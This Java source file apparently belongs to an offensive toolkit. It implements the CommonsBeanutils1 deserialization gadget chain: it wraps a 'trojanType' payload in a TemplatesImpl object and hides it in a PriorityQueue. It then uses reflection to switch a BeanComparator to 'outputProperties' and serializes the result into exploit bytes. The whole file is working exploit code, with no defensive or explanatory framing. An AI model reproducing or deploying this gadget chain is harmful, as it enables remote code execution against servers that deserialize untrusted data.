package core.gadgets;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.Reflections;
import core.utils.MyURLClassLoader;
import core.utils.Util;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1 {

    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, trojanType);
        // mock method name until armed
        BeanComparator beanComparator = new BeanComparator("lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");


        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;

    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object queue = getObject(type, trojanType);
        return Util.serialize(queue);


    }
}
